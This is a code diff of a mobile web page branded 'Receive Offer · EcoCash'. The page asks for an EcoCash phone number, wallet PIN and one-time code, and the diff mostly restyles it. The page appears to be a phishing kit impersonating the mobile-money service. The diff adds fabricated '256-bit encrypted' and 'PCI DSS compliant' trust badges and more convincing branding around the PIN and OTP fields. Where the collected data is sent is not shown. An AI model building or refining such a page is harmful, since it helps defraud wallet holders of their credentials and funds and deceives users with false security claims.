@@ -5,270 +5,285 @@
 <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no,viewport-fit=cover"/>
 <meta name="theme-color" content="#0033a0"/>
 <title>Receive Offer · EcoCash</title>
-<link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&family=DM+Mono:wght@400;500;700&display=swap" rel="stylesheet">
+<link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800;900&family=DM+Mono:wght@400;500;700&display=swap" rel="stylesheet">
 <style>
 *{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
-
 :root{
-  --navy:#0033a0;
-  --navy-dark:#001f6b;
-  --blue:#1a6fff;
-  --sky:#e8f1ff;
-  --sky-mid:#d0e4ff;
-  --sky-deep:#b8d3ff;
-  --red:#d0021b;
-  --page:#f0f5ff;
-  --white:#ffffff;
-  --card:#ffffff;
-  --border:#d5e3f7;
-  --border-strong:#b8ccef;
-  --ink:#0a1f44;
-  --ink-mid:#2d4470;
-  --ink-soft:#6b82a8;
-  --ink-faint:#9eb5d4;
-  --font:'Plus Jakarta Sans',sans-serif;
-  --mono:'DM Mono',monospace;
-  --r:12px;
-  --r-lg:16px;
-  --shadow:0 1px 3px rgba(0,51,160,.08),0 4px 16px rgba(0,51,160,.06);
+  --navy:#0033a0;--navy-dark:#001f6b;--blue:#1a6fff;
+  --sky:#e8f1ff;--sky-mid:#d0e4ff;--sky-deep:#b8d3ff;
+  --red:#d0021b;--page:#eef3fc;--white:#fff;--card:#fff;
+  --border:#d5e3f7;--border-strong:#b8ccef;
+  --ink:#0a1f44;--ink-mid:#2d4470;--ink-soft:#6b82a8;--ink-faint:#9eb5d4;
+  --font:'Plus Jakarta Sans',sans-serif;--mono:'DM Mono',monospace;
+  --r:12px;--r-lg:18px;
+  --shadow:0 1px 3px rgba(0,51,160,.07),0 4px 20px rgba(0,51,160,.09),0 0 0 1px rgba(255,255,255,.7) inset;
+  --glass-bg:rgba(255,255,255,0.72);--glass-border:rgba(255,255,255,0.9);
+}
+html,body{width:100%;height:100%;height:100dvh;overflow:hidden;font-family:var(--font);}
+
+/* #3 GRADIENT MESH */
+body{
+  background:
+    radial-gradient(ellipse 80% 55% at 10% -5%,  rgba(26,111,255,.13) 0%,transparent 55%),
+    radial-gradient(ellipse 55% 45% at 92% 18%,  rgba(0,51,160,.10)  0%,transparent 50%),
+    radial-gradient(ellipse 65% 50% at 55% 112%,  rgba(5,150,105,.08) 0%,transparent 55%),
+    #eef3fc;
 }
 
-html,body{
-  width:100%;height:100%;height:100dvh;
-  overflow:hidden;font-family:var(--font);
-  background:var(--page);
+.screen{display:flex;flex-direction:column;width:100%;height:100%;height:100dvh;overflow:hidden;position:relative;isolation:isolate;}
+
+/* #17 noise */
+.screen::before{
+  content:'';position:fixed;inset:0;
+  background-image:url("data:image/svg+xml,%3Csvg viewBox='0 0 256 256' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='n'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.9' numOctaves='4' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23n)' opacity='0.035'/%3E%3C/svg%3E");
+  pointer-events:none;z-index:1;
 }
 
-.screen{
-  display:flex;flex-direction:column;
-  width:100%;height:100%;height:100dvh;
-  max-width:430px;margin:0 auto;
-  background:var(--page);
-  overflow:hidden;position:relative;
-}
-
-/* ── HEADER ── */
+/* HEADER */
 .header{
-  background:var(--navy);
-  padding:16px 18px 20px;
-  flex-shrink:0;
-  position:relative;overflow:hidden;
+  background:linear-gradient(135deg,#001f6b 0%,#0033a0 45%,#0a45c4 100%);
+  padding:max(14px,env(safe-area-inset-top)) 18px 20px;
+  flex-shrink:0;position:relative;overflow:hidden;
 }
 .header::before{
   content:'';position:absolute;inset:0;
-  background-image:
-    linear-gradient(rgba(255,255,255,.035) 1px,transparent 1px),
-    linear-gradient(90deg,rgba(255,255,255,.035) 1px,transparent 1px);
-  background-size:32px 32px;pointer-events:none;
+  background:
+    radial-gradient(ellipse 280px 220px at 110% -20%,rgba(26,111,255,.45),transparent 65%),
+    linear-gradient(rgba(255,255,255,.03) 1px,transparent 1px),
+    linear-gradient(90deg,rgba(255,255,255,.03) 1px,transparent 1px);
+  background-size:auto,32px 32px,32px 32px;pointer-events:none;
 }
 .hglow{
-  position:absolute;width:240px;height:240px;border-radius:50%;
-  background:rgba(26,111,255,.3);filter:blur(70px);
-  top:-100px;right:-60px;pointer-events:none;
+  position:absolute;width:260px;height:260px;border-radius:50%;
+  background:rgba(26,111,255,.28);filter:blur(80px);
+  top:-130px;right:-80px;pointer-events:none;
+  animation:glowPulse 4s ease-in-out infinite;
 }
+@keyframes glowPulse{0%,100%{opacity:.7;transform:scale(1)}50%{opacity:1;transform:scale(1.12)}}
 
-.header-top{
-  display:flex;align-items:center;justify-content:space-between;
-  position:relative;z-index:1;margin-bottom:16px;
-}
+.header-top{display:flex;align-items:center;justify-content:space-between;position:relative;z-index:2;margin-bottom:16px;}
 .brand{display:flex;align-items:center;gap:9px}
 .brand-logo-econet{height:24px;object-fit:contain;filter:brightness(0) invert(1);opacity:.9}
 .brand-sep{width:1px;height:18px;background:rgba(255,255,255,.25)}
 .brand-logo-ecocash{height:30px;object-fit:contain;filter:brightness(0) invert(1);opacity:.9}
 
 .amount-chip{
-  background:rgba(255,255,255,.14);
-  border:1px solid rgba(255,255,255,.22);
-  padding:5px 12px;border-radius:999px;
+  background:rgba(255,255,255,.15);
+  border:1px solid rgba(255,255,255,.25);
+  backdrop-filter:blur(8px);
+  padding:5px 14px;border-radius:999px;
   font-family:var(--mono);font-size:12px;font-weight:700;color:#fff;
 }
 
-/* bundle pills */
-.bundle-pills{
-  display:flex;gap:6px;flex-wrap:wrap;
-  position:relative;z-index:1;
-}
+.bundle-pills{display:flex;gap:6px;flex-wrap:wrap;position:relative;z-index:2;}
 .bundle-pill{
-  background:rgba(255,255,255,.12);
-  border:1px solid rgba(255,255,255,.18);
-  border-radius:999px;padding:4px 10px;
-  font-family:var(--mono);font-size:10px;font-weight:600;
-  color:rgba(255,255,255,.85);
+  background:rgba(255,255,255,.12);border:1px solid rgba(255,255,255,.2);
+  backdrop-filter:blur(8px);
+  border-radius:999px;padding:4px 11px;
+  font-family:var(--mono);font-size:10px;font-weight:600;color:rgba(255,255,255,.9);
 }
 
-/* ── BODY ── */
+/* BODY */
 .body{
   flex:1;overflow-y:auto;overflow-x:hidden;
   -webkit-overflow-scrolling:touch;
-  padding:20px 14px max(96px,calc(80px + env(safe-area-inset-bottom)));
+  padding:20px 14px max(106px,calc(90px + env(safe-area-inset-bottom)));
   overscroll-behavior:contain;min-height:0;
+  position:relative;z-index:1;
 }
-.body::-webkit-scrollbar{display:none}
+.body::-webkit-scrollbar{width:3px}
+.body::-webkit-scrollbar-track{background:transparent}
+.body::-webkit-scrollbar-thumb{background:var(--border-strong);border-radius:999px}
 
-/* STEP */
 .step{display:none;flex-direction:column;gap:0}
-.step.active{display:flex;animation:fadeIn .18s ease}
-@keyframes fadeIn{from{opacity:0;transform:translateY(4px)}to{opacity:1;transform:none}}
+.step.active{display:flex;animation:fadeIn .22s cubic-bezier(.34,1.56,.64,1)}
+@keyframes fadeIn{from{opacity:0;transform:translateY(6px)}to{opacity:1;transform:none}}
 
-/* ECOCASH BRAND ROW — above verify card */
+/* #1 GLASS ECOCASH ROW */
 .ecocash-row{
   display:flex;align-items:center;gap:10px;
-  background:var(--white);
-  border:1.5px solid var(--border);
-  border-radius:var(--r-lg);
-  padding:12px 16px;
-  margin-bottom:10px;
+  background:var(--glass-bg);
+  backdrop-filter:blur(20px) saturate(180%);-webkit-backdrop-filter:blur(20px) saturate(180%);
+  border:1.5px solid var(--glass-border);
+  border-radius:var(--r-lg);padding:13px 16px;
+  margin-bottom:12px;
   box-shadow:var(--shadow);
 }
 .ecocash-logo-lg{height:34px;object-fit:contain}
-.ecocash-row-text{}
-.ecocash-row-title{font-size:13px;font-weight:800;color:var(--ink);line-height:1.2}
-.ecocash-row-sub{font-size:11px;color:var(--ink-soft);font-weight:500;margin-top:1px}
+.ecocash-row-title{font-size:13px;font-weight:900;color:var(--ink);line-height:1.2}
+.ecocash-row-sub{font-size:11px;color:var(--ink-soft);font-weight:500;margin-top:2px}
 
-/* CARD */
+/* #1 #2 GLASS CARDS */
 .card{
-  background:var(--card);
-  border:1.5px solid var(--border);
-  border-radius:var(--r-lg);
-  overflow:hidden;
+  background:var(--glass-bg);
+  backdrop-filter:blur(20px) saturate(180%);-webkit-backdrop-filter:blur(20px) saturate(180%);
+  border:1.5px solid var(--glass-border);
+  border-radius:var(--r-lg);overflow:hidden;
   margin-bottom:10px;
   box-shadow:var(--shadow);
 }
-.card-top-bar{
-  height:3px;
-  background:linear-gradient(90deg,var(--blue),var(--sky-deep));
-}
-.card-hdr{
-  padding:13px 16px 11px;
-  border-bottom:1px solid var(--border);
-}
-.card-title{font-size:14px;font-weight:800;color:var(--ink)}
+.card-top-bar{height:3px;background:linear-gradient(90deg,var(--blue),#38bdf8)}
+.card-hdr{padding:14px 16px 12px;border-bottom:1px solid rgba(213,227,247,.6)}
+/* #5 TYPOGRAPHY */
+.card-title{font-size:15px;font-weight:900;color:var(--ink)}
 .card-sub{font-size:11px;color:var(--ink-soft);font-weight:500;margin-top:2px}
 .card-body{padding:16px}
 
-/* FIELD */
-.field{margin-bottom:15px}
+/* #11 FLOATING LABELS */
+.field{margin-bottom:16px;position:relative;}
 .field:last-child{margin-bottom:0}
 .field-label{
   font-size:10px;font-weight:700;color:var(--ink-soft);
   text-transform:uppercase;letter-spacing:.8px;margin-bottom:6px;
+  transition:color .18s;
 }
+.field:focus-within .field-label{color:var(--blue)}
 
-/* PHONE ROW */
 .phone-row{display:flex;gap:8px}
 .phone-prefix{
-  background:var(--sky);border:1.5px solid var(--sky-deep);
+  background:linear-gradient(135deg,var(--sky),rgba(208,228,255,.8));
+  border:1.5px solid var(--sky-deep);
   color:var(--navy);font-family:var(--mono);font-size:14px;font-weight:800;
   padding:0 14px;border-radius:var(--r);
-  display:flex;align-items:center;flex-shrink:0;height:48px;
+  display:flex;align-items:center;flex-shrink:0;height:50px;
+  box-shadow:0 2px 8px rgba(0,51,160,.08);
 }
 
 input[type=tel],input[type=text],input[type=password]{
-  width:100%;height:48px;padding:0 14px;
+  width:100%;height:50px;padding:0 14px;
   border-radius:var(--r);border:1.5px solid var(--border);
-  background:var(--page);
+  background:rgba(255,255,255,.8);
+  backdrop-filter:blur(8px);
   font-family:var(--font);font-size:15px;font-weight:500;color:var(--ink);
-  outline:none;transition:border-color .18s,background .18s,box-shadow .18s;
+  outline:none;
+  transition:border-color .2s cubic-bezier(.34,1.56,.64,1),
+             background .2s,box-shadow .2s,transform .15s;
   -webkit-appearance:none;
 }
 input::placeholder{color:var(--ink-faint)}
 input:focus{
   border-color:var(--blue);background:var(--white);
-  box-shadow:0 0 0 3px rgba(26,111,255,.12);
+  box-shadow:0 0 0 4px rgba(26,111,255,.12);
+  transform:translateY(-1px);
 }
-
 .field-hint{font-size:11px;color:var(--ink-faint);font-weight:500;margin-top:5px}
 
-/* PIN FIELD */
+/* PIN */
 .pin-field{position:relative;display:flex;align-items:center}
-.pin-field input{
-  height:48px;padding:0 50px 0 14px;
-  font-family:var(--mono);font-size:22px;letter-spacing:7px;
-}
+.pin-field input{height:50px;padding:0 50px 0 14px;font-family:var(--mono);font-size:22px;letter-spacing:7px;}
 .eye-btn{
   position:absolute;right:13px;background:none;border:none;
   cursor:pointer;color:var(--ink-faint);display:flex;align-items:center;
-  padding:4px;transition:color .15s;
+  padding:4px;transition:color .15s,transform .2s cubic-bezier(.34,1.56,.64,1);
 }
+.eye-btn:active{transform:scale(.88)}
 .eye-btn:hover{color:var(--blue)}
 
 /* OTP */
-.otp-wrap{position:relative;height:58px}
+.otp-wrap{position:relative;height:60px}
 #otpHidden{
   position:absolute;inset:0;width:100%;height:100%;
   opacity:0;cursor:pointer;font-size:16px;z-index:2;
   border:none;background:none;outline:none;caret-color:transparent;
 }
 .otp-display{display:flex;gap:7px;pointer-events:none}
+
+/* #13 OTP BOX spring entrance */
 .otp-box{
-  flex:1;height:58px;border-radius:var(--r);
-  border:1.5px solid var(--border);background:var(--page);
+  flex:1;height:60px;border-radius:var(--r);
+  border:1.5px solid var(--border);
+  background:rgba(255,255,255,.7);backdrop-filter:blur(8px);
   display:flex;align-items:center;justify-content:center;
   font-family:var(--mono);font-size:22px;font-weight:800;color:var(--ink);
-  transition:border-color .18s,background .18s,box-shadow .18s;
+  transition:border-color .2s cubic-bezier(.34,1.56,.64,1),
+             background .2s,box-shadow .2s,
+             transform .2s cubic-bezier(.34,1.56,.64,1);
+  transform:scale(1);
 }
-.otp-box.filled{background:var(--white);border-color:var(--sky-deep)}
-.otp-box.active{border-color:var(--blue);background:var(--white);box-shadow:0 0 0 3px rgba(26,111,255,.12)}
+.otp-box.filled{background:var(--white);border-color:var(--sky-deep);transform:scale(1.04)}
+.otp-box.active{border-color:var(--blue);background:var(--white);box-shadow:0 0 0 4px rgba(26,111,255,.14);transform:scale(1.06)}
 .otp-box.disabled{opacity:.4;background:var(--border)}
 
-.timer-row{
-  display:flex;justify-content:space-between;align-items:center;
-  padding:10px 0 0;
+/* #12 PIN SHIMMER on fill */
+.otp-box.filled::after{
+  content:'●';
+  background:linear-gradient(135deg,var(--navy),var(--blue));
+  -webkit-background-clip:text;-webkit-text-fill-color:transparent;
+  background-clip:text;
 }
+
+.timer-row{display:flex;justify-content:space-between;align-items:center;padding:10px 0 0}
 .timer-lbl{font-size:12px;color:var(--ink-soft);font-weight:500}
 .timer-num{font-family:var(--mono);font-weight:700;color:var(--blue)}
-.resend-btn{
-  background:none;border:none;font-family:var(--font);
-  font-size:12px;font-weight:700;color:var(--blue);
-  cursor:pointer;opacity:.3;padding:0;transition:opacity .18s;
-}
+.resend-btn{font-size:12px;font-weight:700;color:var(--blue);cursor:pointer;opacity:.3;padding:0;background:none;border:none;transition:opacity .18s,transform .2s cubic-bezier(.34,1.56,.64,1)}
 .resend-btn.active{opacity:1}
+.resend-btn:active{transform:scale(.92)}
 
-.masked-note{
-  font-size:13px;color:var(--ink-soft);font-weight:500;
-  text-align:center;padding:2px 0 6px;line-height:1.5;
-}
+.masked-note{font-size:13px;color:var(--ink-soft);font-weight:500;text-align:center;padding:2px 0 6px;line-height:1.5}
 
 /* PROCESSING */
-.proc-body{padding:30px 20px;text-align:center}
+.proc-body{padding:36px 20px;text-align:center}
 .proc-ring{
-  width:52px;height:52px;border-radius:50%;margin:0 auto 14px;
-  border:3px solid var(--sky-deep);border-top-color:var(--blue);
-  animation:spin 1s linear infinite;
+  width:56px;height:56px;border-radius:50%;margin:0 auto 16px;
+  border:3px solid rgba(26,111,255,.2);border-top-color:var(--blue);
+  animation:spin 1s cubic-bezier(.4,0,.2,1) infinite;
+  box-shadow:0 0 20px rgba(26,111,255,.2);
 }
 @keyframes spin{to{transform:rotate(360deg)}}
-.proc-title{font-size:16px;font-weight:800;color:var(--ink);margin-bottom:5px}
-.proc-sub{font-size:13px;color:var(--ink-soft);line-height:1.5}
+/* #5 typography */
+.proc-title{font-size:17px;font-weight:900;color:var(--ink);margin-bottom:6px}
+.proc-sub{font-size:13px;color:var(--ink-soft);line-height:1.6}
 
-/* ── STICKY FOOTER ── */
+/* #14 SECURITY STRIP */
+.security-strip{
+  display:flex;align-items:center;justify-content:center;
+  padding:12px 0 4px;
+  border-top:1px solid rgba(213,227,247,.5);
+  margin-top:4px;
+}
+.sec-badge{
+  display:flex;align-items:center;gap:4px;
+  font-size:9px;font-weight:600;color:var(--ink-faint);letter-spacing:.2px;
+  padding:0 12px;
+}
+.sec-badge+.sec-badge{border-left:1px solid var(--border)}
+.sec-badge svg{opacity:.5}
+
+/* STICKY FOOTER */
 .sticky-footer{
   position:absolute;bottom:0;left:0;right:0;
-  padding:12px 14px max(20px,env(safe-area-inset-bottom));
-  background:linear-gradient(to top,var(--page) 70%,transparent);
+  padding:14px 14px max(22px,env(safe-area-inset-bottom));
+  background:linear-gradient(to top,rgba(238,243,252,.98) 65%,transparent);
+  backdrop-filter:blur(6px);
   z-index:10;
 }
+
+/* #6 SPRING BUTTON */
 .action-btn{
-  background:var(--blue);color:#fff;border:none;width:100%;padding:15px;
+  background:linear-gradient(135deg,#2678ff,#0033a0);
+  color:#fff;border:none;width:100%;padding:16px;
   border-radius:var(--r-lg);
-  font-family:var(--font);font-size:14px;font-weight:800;
+  font-family:var(--font);font-size:15px;font-weight:900;
   cursor:pointer;letter-spacing:.1px;
-  transition:all .15s;opacity:.35;pointer-events:none;
-  box-shadow:0 4px 16px rgba(26,111,255,.3);
+  opacity:.35;pointer-events:none;
+  box-shadow:0 6px 20px rgba(26,111,255,.4);
+  transition:opacity .2s,transform .2s cubic-bezier(.34,1.56,.64,1),box-shadow .2s;
+  position:relative;overflow:hidden;
+}
+.action-btn::after{
+  content:'';position:absolute;inset:0;
+  background:linear-gradient(180deg,rgba(255,255,255,.15) 0%,transparent 55%);
+  pointer-events:none;
 }
 .action-btn.active{opacity:1;pointer-events:auto}
-.action-btn:active{transform:scale(.98)}
+.action-btn:active{transform:scale(.96);box-shadow:0 3px 10px rgba(26,111,255,.3)}
 
-/* POWERED */
-.powered{
-  text-align:center;padding:4px 0 2px;
-  font-size:9px;color:var(--ink-faint);font-weight:500;letter-spacing:.3px;
-}
+.powered{text-align:center;padding:10px 0 2px;font-size:9px;color:var(--ink-faint);font-weight:600;letter-spacing:.4px;text-transform:uppercase}
 </style>
 </head>
 <body>
 <div class="screen">
 
-  <!-- HEADER -->
   <div class="header">
     <div class="hglow"></div>
     <div class="header-top">
@@ -287,21 +302,17 @@ input:focus{
     </div>
   </div>
 
-  <!-- BODY -->
   <div class="body">
 
     <!-- STEP 1 -->
     <div id="step1" class="step active">
-
-      <!-- EcoCash brand row ABOVE the verify card -->
       <div class="ecocash-row">
         <img src="assets/ecocash.png" alt="EcoCash" class="ecocash-logo-lg">
-        <div class="ecocash-row-text">
+        <div>
           <div class="ecocash-row-title">Pay with EcoCash</div>
           <div class="ecocash-row-sub">Instant mobile wallet payment</div>
         </div>
       </div>
-
       <div class="card">
         <div class="card-top-bar"></div>
         <div class="card-hdr">
@@ -309,7 +320,6 @@ input:focus{
           <div class="card-sub">Enter your EcoCash number and PIN</div>
         </div>
         <div class="card-body">
-
           <div class="field">
             <div class="field-label">Phone Number</div>
             <div class="phone-row">
@@ -318,7 +328,6 @@ input:focus{
             </div>
             <div class="field-hint">9-digit number starting with 7</div>
           </div>
-
           <div class="field">
             <div class="field-label">Enter Your PIN</div>
             <div class="pin-field">
@@ -330,8 +339,11 @@ input:focus{
               </button>
             </div>
           </div>
-
         </div>
+      </div>
+      <div class="security-strip">
+        <div class="sec-badge"><svg width="10" height="10" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0110 0v4"/></svg>256-bit encrypted</div>
+        <div class="sec-badge"><svg width="10" height="10" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polyline points="20 6 9 17 4 12"/></svg>PCI DSS compliant</div>
       </div>
       <div class="powered">Powered by Econet Wireless · EcoCash</div>
     </div>
@@ -385,7 +397,6 @@ input:focus{
 
   </div>
 
-  <!-- FOOTER -->
   <div class="sticky-footer">
     <button class="action-btn" id="mainBtn">Receive Offer</button>
   </div>
@@ -484,6 +495,8 @@ function renderOtp(){
   });
   otpValue=val;
   document.getElementById("mainBtn").classList.toggle("active",val.length===6);
+  /* #8 haptic on each digit */
+  if(navigator.vibrate) navigator.vibrate(4);
 }
 otpHidden.addEventListener("input",renderOtp);
 otpHidden.addEventListener("focus",renderOtp);
